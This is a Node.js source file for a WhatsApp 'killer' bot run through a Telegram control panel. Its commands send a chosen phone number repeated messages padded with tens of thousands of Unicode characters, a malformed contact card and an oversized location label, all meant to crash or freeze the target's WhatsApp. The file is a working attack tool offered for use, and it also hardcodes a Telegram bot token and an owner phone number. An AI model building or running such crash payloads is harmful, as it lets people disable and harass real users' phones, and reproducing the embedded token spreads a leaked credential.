const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay 
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

let botConfig = {
    botName: "NEXUS-MD KILLER-V3",
    owner: "94767475809", 
    prefix: ".",
    isPublic: false
};

// --- 🌐 WEB SERVER ---
app.get('/', (req, res) => res.send('Nexus Killer System is Active! ☠️'));
if (!global.serverStarted) {
    app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));
    global.serverStarted = true;
}

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"], 
        printQRInTerminal: false
    });

    // --- 🤖 TELEGRAM PAIRING & MENU ---
    tgBot.onText(/\/start/, (msg) => {
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔥 GET PAIRING CODE', callback_data: 'get_code' }],
                    [{ text: '☠️ BUG LIST', callback_data: 'bug_list' }]
                ]
            }
        };
        tgBot.sendMessage(msg.chat.id, `☠️ *NEXUS-MD ULTIMATE KILLER* ☠️\n\nWelcome Master! Select an option:`, { parse_mode: 'Markdown', ...opts });
    });

    tgBot.on('callback_query', (query) => {
        if (query.data === 'get_code') {
            tgBot.sendMessage(query.message.chat.id, "ඔබගේ WhatsApp අංකය එවන්න (Ex: 947xxxxxxxx)");
        } else if (query.data === 'bug_list') {
            const bugs = `🔥 *COMMANDS LIST (PRIVATE)*\n\n` +
                         `.the_end [number] - iPhone/Android Killer\n` +
                         `.vcard [number] - Contact Freeze\n` +
                         `.loc [number] - Location Lag\n` +
                         `.kill [number] - Unicode Crash`;
            tgBot.sendMessage(query.message.chat.id, bugs, { parse_mode: 'Markdown' });
        }
    });

    tgBot.on('message', async (msg) => {
        if (msg.text && /^\d+$/.test(msg.text) && msg.text.length > 9) {
            try {
                let code = await sock.requestPairingCode(msg.text.replace(/[^0-9]/g, ''));
                tgBot.sendMessage(msg.chat.id, `🔥 *YOUR SYSTEM KEY:* \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) { tgBot.sendMessage(msg.chat.id, "❌ Error!"); }
        }
    });

    // --- 📩 WHATSAPP BUG HANDLER ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const from = mek.key.remoteJid;
            const sender = mek.key.participant || mek.key.remoteJid;
            const isOwner = sender.includes(botConfig.owner) || mek.key.fromMe;
            
            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            const isCmd = body.startsWith(botConfig.prefix);
            const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : "";
            const text = body.trim().split(/ +/).slice(1).join(" ");

            if (isCmd && !isOwner) return; 

            if (isCmd) {
                const target = text + "@s.whatsapp.net";

                switch (command) {
                    case 'menu':
                        await sock.sendMessage(from, { text: `☠️ *NEXUS-MD ULTIMATE*\n\n.the_end\n.vcard\n.kill\n.loc\n\n_Status: Deadly_` }, { quoted: mek });
                        break;

                    case 'the_end': // 🔥 IPHONE & ANDROID KILLER (10M+ CHARACTERS)
                        if (!text) return;
                        await sock.sendMessage(from, { text: "🚀 Sending THE END Bug... Target: " + text });
                        const superBug = "☠️ THE END ☠️\n" + "ꦿ".repeat(50000) + "᥋".repeat(50000) + "꠵".repeat(50000);
                        for (let i = 0; i < 10; i++) {
                            await sock.sendMessage(target, { text: superBug });
                            await delay(300);
                        }
                        await sock.sendMessage(from, { text: "💀 Target System Destroyed!" });
                        break;

                    case 'vcard':
                        if (!text) return;
                        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:Crash Master\n' + 'TEL;waid=' + text + ':+' + text + '\n' + 'END:VCARD'.repeat(200);
                        await sock.sendMessage(target, { contacts: { displayName: 'Nexus-MD', contacts: [{ vcard }] } });
                        break;

                    case 'kill':
                        if (!text) return;
                        await sock.sendMessage(target, { text: "☠️" + "ꦿ".repeat(80000) });
                        break;

                    case 'loc':
                        if (!text) return;
                        await sock.sendMessage(target, { location: { degreesLatitude: 37, degreesLongitude: -122, name: "Nexus-MD-" + "Z".repeat(30000) } });
                        break;
                }
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (up) => {
        if (up.connection === 'close') startNexus();
        else if (up.connection === 'open') console.log('KILLER BOT READY!');
    });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
